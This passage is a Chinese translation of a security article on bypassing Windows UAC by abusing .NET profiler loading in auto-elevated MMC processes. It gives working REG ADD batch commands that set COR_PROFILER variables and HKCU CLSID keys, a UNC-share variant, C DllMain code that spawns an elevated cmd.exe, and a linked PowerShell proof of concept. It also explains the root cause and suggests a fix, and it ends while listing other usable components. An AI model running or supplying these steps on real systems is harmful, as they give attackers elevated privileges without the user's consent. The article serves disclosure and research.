# 【技术分享】如何通过特权.NET应用绕过UAC
|
##### 译文声明
本文是翻译文章，文章来源：provadys.com
原文地址：
译文仅供参考，具体内容表达以及含义原文为准。
译者：[兴趣使然的小胃](http://bobao.360.cn/member/contribute?uid=2819002922)
预估稿费：200RMB
投稿方式：发送邮件至linwei#360.cn，或登陆网页版在线投稿
**一、前言**
****
即使进程处于特权模式下，.NET Framework也可以通过用户定义的环境变量以及CLSID注册表项来加载Profiling
DLL或者COM组件DLL。这样一来，攻击者就可以利用自动提升权限的.NET进程（比如MMC管理单元）来加载任意DLL，从而绕过Windows
7到10系统（包括最新的RS3版本）中处于默认配置下的UAC机制。
**二、简介**
****
去年5月份时，Casey
Smith在他自己的[推特](https://twitter.com/subTee/status/864903111952875521)以及[博客](http://subt0x10.blogspot.fr/2017/05/subvert-clr-process-listing-with-net.html)上指出，在环境变量的帮助下，攻击者可以利用 .NET profiler
DLL加载机制迫使合法的.NET应用加载恶意DLL。
刚得知这些信息时，我首先想到的是，“如果这种情况也适用于特权.NET进程，那么这无疑又是绕过UAC的一个绝佳方法”。事实证明的确如此。
本文成稿时，这个问题还没有被修复，可能现在依然处于未修复状态。由于Stefan
Kanthak独自发现、报告并公布了[全部细节](http://seclists.org/fulldisclosure/2017/Jul/11)，因此自7月以来，所有人都已经知道了具体方法。
**三、绕过UAC**
****
我们可以使用如下环境变量，使.NET应用加载任意DLL：
    COR_ENABLE_PROFILING=1 COR_PROFILER={GUID} COR_PROFILER_PATH=C:pathtosome.dll
对于4.0以下版本的 .NET，我们必须在注册表中的 **HKCRCLSID{GUID}InprocServer32**
路径下定义CLSID键值，并包含profiling DLL的具体路径。在最新的版本中，CLR（Common Language
Runtime，公共语言运行库）使用 **CORPROFILERPATH** 这个环境变量来寻找DLL，如果未定义 **CORPROFILERPATH**
环境变量，那么CLR会继续使用CLSID这种寻路机制。
**HKCRCLSID** 同时代表着HKLM以及HKCU中的 **SoftwareClassesCLSID**
路径。在HKLM（或者主机级别的环境变量）中创建CLSID键值需要提升权限，然而在HKCU中创建相应键值却可以绕过权限限制。关键点在于，
**用户级别的环境变量以及注册表项不会对程序的正常运行造成任何影响** 。
现在，我们只需要一个可以自动提升权限（默认设置下不会出现UAC提示符）的可执行程序，然后使用 .NET CLR来加载我们伪造的profiler
DLL即可。MMC是非常适合的一个目标，在我的测试过程中，我使用的是gpedit MMC，当然还有其他MMC可用（稍后我会给出具体列表）。
我们只需要如下几条批处理命令，就能完成这个任务：
    REG ADD "HKCUSoftwareClassesCLSID{FFFFFFFF-FFFF-FFFF-FFFF-FFFFFFFFFFFF}InprocServer32" /ve /t REG_EXPAND_SZ /d "C:Temptest.dll" /f
    REG ADD "HKCUEnvironment" /v "COR_PROFILER" /t REG_SZ /d "{FFFFFFFF-FFFF-FFFF-FFFF-FFFFFFFFFFFF}" /f
    REG ADD "HKCUEnvironment" /v "COR_ENABLE_PROFILING" /t REG_SZ /d "1" /f
    REG ADD "HKCUEnvironment" /v "COR_PROFILER_PATH" /t REG_SZ /d "C:Temptest.dll" /f
    mmc gpedit.msc
在普通权限的命令提示符中运行这些命令后，我们就可以在mmc.exe特权进程中加载 **C:Temptest.dll** （当然前提是这个文件存在）。
通过这种方式，我们可以绕过Windows 7到10系统（包括最新的RS3版本）上使用默认配置的UAC机制。
PowerShell版本的PoC代码参考[此链接](https://gist.github.com/clavoillotte/f2fba9fa4ba8db14093a62164963d4a9)，PoC中内置了一个64位的DLL。
这个DLL仅有的功能是当DLLPROCESSATTACH时运行cmd.exe，获得特权命令行shell，然后立刻退出当前进程以避免弹出MMC控制台。
    BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved) { char cmd[] = "cmd.exe";
    switch (fdwReason)
    {
    case DLL_PROCESS_ATTACH:
        WinExec(cmd, SW_SHOWNORMAL);
        ExitProcess(0);
        break;
    case DLL_THREAD_ATTACH:
        break;
    case DLL_THREAD_DETACH:
        break;
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
    }
PoC代码已在x64版的Windows 7、8.1、10 1703以及10 RS3 build 16275上测试通过。
当然，如果你使用的是SMB共享形式的UNC路径，PoC代码也能正常工作：
    COR_PROFILER_PATH=\serversharetest.dll
**四、根本原因**
****
虽然在特权进程中运行时，COM运行时会禁止在 **用户注册表（HKCU）**
中搜索CLSID键值，以避免UAC被绕过，然而.NET运行时却没有这么做，并且在本文演示的场景中，查找过程由后者发起，负责组件的查找工作：
为了修复这个问题，CLR应该使用与COM类似的检查过程。
**五、其他可用实例**
****
既然我们已理清CLR的工作过程，我们可以观察栈中的CLR调用，检查HKCU中具体搜索的CLSID，找到其他可用实例。GPEdit中存在另一个可用的实例，也就是“
**Microsoft.GroupPolicy.AdmTmplEditor.GPMAdmTmplEditorManager**
”组件（在我测试用的虚拟机上为CLSID {B29D466A-857D-35BA-8712-A758861BFEA1}）：
观察HKCR中已有的键值，我们发现该组件本身似乎就是使用CLR程序集（assembly）来实现：